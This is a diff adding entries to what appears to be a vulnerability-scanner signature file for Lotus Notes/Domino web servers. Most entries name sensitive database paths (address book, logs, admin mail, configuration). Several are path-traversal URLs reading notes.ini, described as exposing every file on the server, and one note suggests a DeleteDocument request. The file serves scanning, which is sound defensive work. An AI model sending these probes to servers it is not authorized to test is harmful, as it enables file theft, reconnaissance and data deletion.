+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf.nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf/..///lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf/..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf/../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf//..//lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf//../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/.nsf///../lotus/domino/notes.ini</get>
+   <info>This url allow to retreive files from notes server. If you are able to get this you can get every file on server. Upgrade to Domino 5.0.6a<br>NB: Explorer my have problem to check this link. Use Netscape instead</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/admin4.nsf</get>
+   <info>Notes 4 administrator database</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/busytime.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/catalog.nsf</get>
+   <info>List of all database in Lotus Notes Server</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/certsrv.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/database.nsf</get>
+   <info>List of all Lotus Domino database</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/database.nsf/e1466a8590/6048076233?OpenDocument</get>
+   <info>Someone also suggesto to use a /database.nsf/e146fa8590/6148076233?DeleteDocument on this document</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/database.nsf/e146fa8590/6148076233?EditDocument</get>
+   <info>Someone also suggesto to use a /database.nsf/e146fa8590/6148076233?DeleteDocument on this document</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/decsdoc.nsf</get>
+   <info>Lotus Notes - Domino Enterprise Connection Services</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/domcfg.nsf</get>
+   <info>Louts Notes server Configuration</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/domcfg.nsf/?open</get>
+   <info>Lotus Domino configuration</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/domcfg.nsf/URLRedirect/?OpenForm.</get>
+   <info>/domcfg.nsf/URLRedirect/?OpenForm.</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/domlog.nsf</get>
+   <info>Log of notes server</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/help/help5_admin.nsf</get>
+   <info>Lotus Notes 5 - Administrator Help</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/help/help5_client.nsf</get>
+   <info>Lotus Notes 5 - Client Help</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/help/help5_designer.nsf</get>
+   <info>Lotus Notes 5 - Designer Help</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/help/readme.nsf</get>
+   <info>Lotus Notes 5 - Readne</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/helplt4.nsf</get>
+   <info>Lotus Notes - Help lite version</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/homepage.nsf</get>
+   <info>Lotus Notes 5 - Homepage database</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/homepage.nsf/$defaultnav</get>
+   <info>Lotus Notes - homepage database administrator view</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/lccon.nsf</get>
+   <info>Lotus Notes - Lotus Connectors Connectivity</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/log.nsf</get>
+   <info>Log of Lotus Notes server</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/lsxlc.nsf</get>
+   <info>Lotus Notes - LSX for Lotus Connectors Manual</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/mail\admin.nsf</get>
+   <info>Lotus Notes administrator mail</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/mtaforms.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/names.nsf</get>
+   <info>Address book of Lotus Notes server</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/qstart.nsf</get>
+   <info>Lotus Notes - Quick Start</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/readme.nsf</get>
+   <info>Lotus Notes - readme file. Usefull to detect the right Notes release</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/readmec.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/readmes.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\faqw46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\framew46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\pagesw46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\siregw46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\site1w46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\site2w46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/sample\site3w46.nsf</get>
+   <info>Lotus Notes Sample</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/setup.nsf</get>
+   <info>Lotus Notes - Domino Setup</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/smtpobwq.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/smtptbls.nsf</get>
+   <info>Lotus Notes - SMTP MTA Tables</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/stats408.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/stats855.nsf</get>
+   <info>Lotus Notes - statistic</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/today.nsf</get>
+   <info>/today.nsf/</info>
+   <server>notes</server>
+</url>
+
+<url>
+   <get>/webadmin.nsf</get>
+   <info>Lotus Notes</info>
+   <server>notes</server>
+</url>
+
